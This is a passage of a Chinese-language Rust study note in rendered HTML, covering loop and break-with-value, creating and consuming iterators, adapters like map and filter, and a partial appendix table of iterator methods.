</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#note-cs-rust-rust-__codelineno-23-12"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="note-cs-rust-rust-loop">loop循环<a class="headerlink" href="#note-cs-rust-rust-loop" title="Permanent link">&para;</a></h3>
<p>rust比较有特点，当我们想使用无限循环的时候，不必<code>while true{}</code>而本身就内置有<code>loop</code>结构无限循环</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#note-cs-rust-rust-__codelineno-24-1"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#note-cs-rust-rust-__codelineno-24-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="sc">&#39;R&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;U&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;N&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;O&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;O&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;B&#39;</span><span class="p">];</span><span class="w"> </span>
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#note-cs-rust-rust-__codelineno-24-3"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#note-cs-rust-rust-__codelineno-24-4"></a><span class="w">    </span><span class="k">loop</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#note-cs-rust-rust-__codelineno-24-5"></a><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">ch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w"> </span>
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#note-cs-rust-rust-__codelineno-24-6"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">ch</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;O&#39;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#note-cs-rust-rust-__codelineno-24-7"></a><span class="w">            </span><span class="k">break</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#note-cs-rust-rust-__codelineno-24-8"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span>
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#note-cs-rust-rust-__codelineno-24-9"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\&#39;</span><span class="s">{}</span><span class="se">\&#39;</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ch</span><span class="p">);</span>
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#note-cs-rust-rust-__codelineno-24-10"></a><span class="w">        </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#note-cs-rust-rust-__codelineno-24-11"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span>
</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#note-cs-rust-rust-__codelineno-24-12"></a><span class="p">}</span>
</span></code></pre></div>
<code>loop</code>循环的<code>break</code>也可以通过携带关键字来向外部返回一个值,作用类似于<code>return</code></p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#note-cs-rust-rust-__codelineno-25-1"></a><span class="w">   </span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#note-cs-rust-rust-__codelineno-25-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="sc">&#39;R&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;U&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;N&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;O&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;O&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;B&#39;</span><span class="p">];</span><span class="w"> </span>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#note-cs-rust-rust-__codelineno-25-3"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#note-cs-rust-rust-__codelineno-25-4"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">loop</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#note-cs-rust-rust-__codelineno-25-5"></a><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">ch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#note-cs-rust-rust-__codelineno-25-6"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">ch</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;O&#39;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#note-cs-rust-rust-__codelineno-25-7"></a><span class="w">            </span><span class="k">break</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#note-cs-rust-rust-__codelineno-25-8"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span>
</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#note-cs-rust-rust-__codelineno-25-9"></a><span class="w">        </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#note-cs-rust-rust-__codelineno-25-10"></a><span class="w">    </span><span class="p">};</span><span class="w"> </span>
</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#note-cs-rust-rust-__codelineno-25-11"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot; </span><span class="se">\&#39;</span><span class="s">O</span><span class="se">\&#39;</span><span class="s"> 的索引为 {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">location</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#note-cs-rust-rust-__codelineno-25-12"></a><span class="p">}</span>
</span></code></pre></div>
<h2 id="note-cs-rust-rust-_12">迭代器<a class="headerlink" href="#note-cs-rust-rust-_12" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Rust 中的迭代器是一种方便、高效的数据遍历方法，它提供了一种抽象的方式来访问集合中的每个元素，而不需要显式地管理索引或循环。</p>
<p>迭代器允许你以一种声明式的方式来遍历序列，如数组、切片、链表等集合类型的元素。</p>
<p>迭代器背后的核心思想是将数据处理过程与数据本身分离，使代码更清晰、更易读、更易维护。</p>
</blockquote>
<p><strong>迭代器遵循以下原则：</strong></p>
<ul>
<li>
<p><strong>惰性求值</strong>：迭代器不会立即计算其元素，而是在需要时才计算，这使得迭代器可以用于处理无限序列。例如，当调用 <code>map()</code> 或 <code>filter()</code> 方法时，并不会立即对集合进行转换或过滤，而是返回一个新的迭代器，只有当真正需要获取数据时，才会对数据进行转换或过滤。</p>
</li>
<li>
<p><strong>消费性</strong>：在迭代器完成迭代后，它所迭代的集合将被消费，即集合的所有权被转移给迭代器，集合不能再被使用。</p>
</li>
<li>
<p><strong>不可变访问</strong>：迭代器默认以不可变方式访问其元素，这意味着在迭代过程中不能修改元素。</p>
</li>
<li>
<p><strong>所有权</strong>：迭代器可以处理拥有或借用的元素。当迭代器借用元素时，它不会取得元素的所有权。例如，<code>iter()</code> 方法返回的是一个借用迭代器，而 <code>into_iter()</code> 方法返回的是一个获取所有权的迭代器。</p>
</li>
</ul>
<h3 id="note-cs-rust-rust-_13">创建迭代器<a class="headerlink" href="#note-cs-rust-rust-_13" title="Permanent link">&para;</a></h3>
<ul>
<li>使用<code>iter()</code>方法创建借用迭代器
<div class="language-rust highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#note-cs-rust-rust-__codelineno-26-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#note-cs-rust-rust-__codelineno-26-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">iter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vec</span><span class="p">.</span><span class="n">iter</span><span class="p">();</span>
</span></code></pre></div></li>
</ul>
<div class="admonition 代码解释">
<p class="admonition-title">代码解释</p>
<p><code>let vec</code>:
<code>let</code> 关键字用于声明变量，<code>vec</code> 是变量的名称。在这个例子中，<code>vec</code> 将被绑定到一个 <code>Vec&lt;i32&gt;</code> 对象上。</p>
<p><code>vec![]</code> 宏:</p>
<p><code>vec![]</code> 是一个宏，用于创建一个新的 <code>Vec</code>（动态数组）。<code>Vec</code> 是 Rust 标准库提供的一个通用集合类型，可以在运行时动态增长。
通过 <code>vec![]</code> 宏，可以直接创建一个包含初始元素的向量。
<code>[1, 2, 3, 4, 5]</code>:</p>
<p>方括号内的数字 1, 2, 3, 4, 5 是 <code>Vec</code> 的初始元素。
在这个例子中，<code>vec!</code> 宏创建了一个 <code>Vec&lt;i32&gt;</code> 类型的向量，其中包含了这五个整数。</p>
</div>
<ul>
<li>
<p>使用<code>iter_mut()</code> 方法创建可变借用迭代器
<div class="language-rust highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#note-cs-rust-rust-__codelineno-27-1"></a><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#note-cs-rust-rust-__codelineno-27-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">iter_mut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vec</span><span class="p">.</span><span class="n">iter_mut</span><span class="p">();</span>
</span></code></pre></div></p>
</li>
<li>
<p>使用 <code>into_iter()</code> 方法创建获取所有权的迭代器：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#note-cs-rust-rust-__codelineno-28-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#note-cs-rust-rust-__codelineno-28-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">into_iter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vec</span><span class="p">.</span><span class="n">into_iter</span><span class="p">();</span>
</span></code></pre></div></p>
</li>
</ul>
<h3 id="note-cs-rust-rust-_14">迭代器方法<a class="headerlink" href="#note-cs-rust-rust-_14" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><code>map()</code>对每个元素应用特定的转换函数
<div class="language-rust highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#note-cs-rust-rust-__codelineno-29-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#note-cs-rust-rust-__codelineno-29-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">squared_vec</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">i32</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vec</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="n">x</span><span class="o">|</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">x</span><span class="p">).</span><span class="n">collect</span><span class="p">();</span>
</span></code></pre></div>
首先定义了一个包含整数的数组，然后使用 <code>iter()</code> 方法获取数组的迭代器，接着使用迭代器的 <code>map()</code> 方法对数组中的每个元素进行平方运算，并使用 <code>collect()</code> 方法将结果收集到一个新的数组 <code>squared_vec</code> 中。最后输出了平方后的数组。</p>
</li>
<li>
<p><code>filter()</code>根据特定的条件过滤集合中的元素
<div class="language-rust highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#note-cs-rust-rust-__codelineno-30-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#note-cs-rust-rust-__codelineno-30-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">filtered_vec</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">i32</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vec</span><span class="p">.</span><span class="n">into_iter</span><span class="p">().</span><span class="n">filter</span><span class="p">(</span><span class="o">|&amp;</span><span class="n">x</span><span class="o">|</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">).</span><span class="n">collect</span><span class="p">();</span>
</span></code></pre></div>
原理类似</p>
</li>
<li>
<p><code>fold()</code>：对集合中的元素进行累积处理。</p>
</li>
<li><code>skip()</code>：跳过指定数量的元素。</li>
<li><code>take()</code>：获取指定数量的元素。</li>
<li><code>enumerate()</code>：为每个元素提供索引。<blockquote>
<p>感觉记不住，反正先记着，具体用到的时候再搜就行了<img alt="😁" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f601.svg" title=":grin:" /></p>
</blockquote>
</li>
</ul>
<h3 id="note-cs-rust-rust-for_1">for循环遍历迭代器<a class="headerlink" href="#note-cs-rust-rust-for_1" title="Permanent link">&para;</a></h3>
<p>Rust 提供了 for 循环语法来遍历迭代器中的元素，是一种更加简洁和直观的遍历方式。</p>
<p>Rust 的 for 循环底层实际上是使用迭代器的。</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#note-cs-rust-rust-__codelineno-31-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">vec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#note-cs-rust-rust-__codelineno-31-2"></a><span class="k">for</span><span class="w"> </span><span class="o">&amp;</span><span class="n">num</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">vec</span><span class="p">.</span><span class="n">iter</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="c1">//&amp;代表借用</span>
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#note-cs-rust-rust-__codelineno-31-3"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">num</span><span class="p">);</span>
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#note-cs-rust-rust-__codelineno-31-4"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="note-cs-rust-rust-_15">消费迭代器<a class="headerlink" href="#note-cs-rust-rust-_15" title="Permanent link">&para;</a></h3>
<p>使用迭代器直到它被完全消耗
<div class="language-rust highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#note-cs-rust-rust-__codelineno-32-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">];</span>
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#note-cs-rust-rust-__codelineno-32-2"></a><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">iter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arr</span><span class="p">.</span><span class="n">into_iter</span><span class="p">();</span>
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#note-cs-rust-rust-__codelineno-32-3"></a><span class="k">while</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iter</span><span class="p">.</span><span class="n">next</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#note-cs-rust-rust-__codelineno-32-4"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span>
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#note-cs-rust-rust-__codelineno-32-5"></a><span class="p">}</span>
</span></code></pre></div></p>
<h3 id="note-cs-rust-rust-_16">适配器<a class="headerlink" href="#note-cs-rust-rust-_16" title="Permanent link">&para;</a></h3>
<p>迭代器适配器是一系列提供给迭代器的函数，它们可以修改迭代器的行为。例如 map, filter, take 等。
<div class="language-rust highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#note-cs-rust-rust-__codelineno-33-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#note-cs-rust-rust-__codelineno-33-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">even_numbers</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="n">_</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arr</span><span class="p">.</span><span class="n">into_iter</span><span class="p">().</span><span class="n">filter</span><span class="p">(</span><span class="o">|&amp;</span><span class="n">x</span><span class="o">|</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">).</span><span class="n">collect</span><span class="p">();</span>
</span></code></pre></div></p>
<h3 id="note-cs-rust-rust-_17">迭代器链<a class="headerlink" href="#note-cs-rust-rust-_17" title="Permanent link">&para;</a></h3>
<p>可以将多个迭代器适配器链接在一起，形成迭代器链。
<div class="language-rust highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#note-cs-rust-rust-__codelineno-34-1"></a><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">iter</span>::<span class="n">Peekable</span><span class="p">;</span>
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#note-cs-rust-rust-__codelineno-34-2"></a>
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#note-cs-rust-rust-__codelineno-34-3"></a><span class="kd">let</span><span class="w"> </span><span class="n">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#note-cs-rust-rust-__codelineno-34-4"></a><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">iter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arr</span><span class="p">.</span><span class="n">into_iter</span><span class="p">().</span><span class="n">peekable</span><span class="p">();</span>
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#note-cs-rust-rust-__codelineno-34-5"></a><span class="k">while</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iter</span><span class="p">.</span><span class="n">next</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#note-cs-rust-rust-__codelineno-34-6"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#note-cs-rust-rust-__codelineno-34-7"></a><span class="w">        </span><span class="k">continue</span><span class="p">;</span>
</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#note-cs-rust-rust-__codelineno-34-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#note-cs-rust-rust-__codelineno-34-9"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span>
</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#note-cs-rust-rust-__codelineno-34-10"></a><span class="p">}</span>
</span></code></pre></div></p>
<h3 id="note-cs-rust-rust-_18">收集器<a class="headerlink" href="#note-cs-rust-rust-_18" title="Permanent link">&para;</a></h3>
<p>可以使用<code>collect</code>方法将迭代器的元素收集到某种集合中</p>
<h3 id="note-cs-rust-rust-_19">其他<a class="headerlink" href="#note-cs-rust-rust-_19" title="Permanent link">&para;</a></h3>
<p>迭代器的生命周期与它所迭代的元素的生命周期相关联。迭代器可以借用元素，也可以取得元素的所有权。这在迭代器的实现中通过生命周期参数来控制。</p>
<p><strong>迭代器与闭包</strong>
迭代器适配器经常与闭包一起使用，闭包允许你为迭代器操作提供定制逻辑。</p>
<p><strong>迭代器和性能</strong></p>
<p>迭代器通常是非常高效的，因为它们允许编译器做出优化。例如，编译器可以内联迭代器适配器的调用，并且可以利用迭代器的惰性求值特性。、</p>
<h3 id="note-cs-rust-rust-_20">附录:迭代器方法<a class="headerlink" href="#note-cs-rust-rust-_20" title="Permanent link">&para;</a></h3>
<table>
<thead>
<tr>
<th>方法名</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>next()</code></td>
<td>返回迭代器中的下一个元素。</td>
<td><code>let mut iter = (1..5).into_iter(); while let Some(val) = iter.next() { println!("{}", val); }</code></td>
</tr>
<tr>
<td><code>size_hint()</code></td>
<td>返回迭代器中剩余元素数量的下界和上界。</td>
<td><code>let iter = (1..10).into_iter(); println!("{:?}", iter.size_hint());</code></td>
</tr>
<tr>
<td><code>count()</code></td>
<td>计算迭代器中元素的数量。</td>
<td><code>let count = (1..10).into_iter().count();</code></td>
</tr>
<tr>
<td><code>nth()</code></td>
<td>返回迭代器中的第 n 个元素。</td>
<td><code>let third = (0..10).into_iter().nth(2);</code></td>
</tr>
<tr>
<td><code>last()</code></td>
<td>返回迭代器中的最后一个元素。</td>
<td><code>let last = (1..5).into_iter().last();</code></td>
</tr>
<tr>
<td><code>all()</code></td>
<td>如果迭代器中的所有元素都满足某个条件，返回 <code>true</code>。</td>
<td><code>let all_positive = (1..5).into_iter().all(|x| x &gt; 0);</code></td>
</tr>
<tr>
<td><code>any()</code></td>
<td>如果迭代器中的至少一个元素满足某个条件，返回 <code>true</code>。</td>
<td><code>let any_negative = (1..5).into_iter().any(|x| x &lt; 0);</code></td>
</tr>
<tr>
<td><code>find()</code></td>
<td>返回迭代器中第一个满足某条件的元素。</td>
<td><code>let first_even = (1..10).into_iter().find(|x| x % 2 == 0);</code></td>
</tr>
<tr>
<td><code>find_map()</code></td>
<td>对迭代器的元素应用一个函数，返回第一个返回 <code>Some</code> 的结果。</td>
<td><code>let first_letter = "hello".chars().find_map(|c| if c.is_alphabetic() { Some(c) } else { None });</code></td>
</tr>
<tr>
<td><code>map()</code></td>
<td>对迭代器中的每个元素应用一个函数。</td>
<td><code>let squares: Vec&lt;i32&gt; = (1..5).into_iter().map(|x| x * x).collect();</code></td>
</tr>
<tr>
<td><code>filter()</code></td>
<td>保留迭代器中满足某个条件的元素。</td>
<td><code>let evens: Vec&lt;i32&gt; = (1..10).into_iter().filter(|x| x % 2 == 0).collect();</code></td>
</tr>
<tr>
<td><code>filter_map()</code></td>
<td>对迭代器中的元素应用一个函数，如果该函数返回 <code>Some</code>，则保留结果。</td>
<td><code>let chars: Vec&lt;char&gt; = "hello".chars().filter_map(|c| if c.is_alphabetic() { Some(c.to_ascii_uppercase()) } else { None }).collect();</code></td>
</tr>
<tr>
<td><code>map_while()</code></td>
<td>对迭代器中的元素应用一个函数，直到函数返回 <code>None</code>。</td>
<td><code>let first_three = (1..).into_iter().map_while(|x| if x &lt;= 3 { Some(x) } else { None });</code></td>
</tr>
<tr>
<td><code>take_while()</code></td>
<td>从迭代器中取出满足某个条件的元素，直到不满足为止。</td>
<td><code>let first_five = (1..10).into_iter().take_while(|x| x &lt;= 5).collect::&lt;Vec&lt;_&gt;&gt;();</code></td>
</tr>
<tr>
<td><code>skip_while()</code></td>
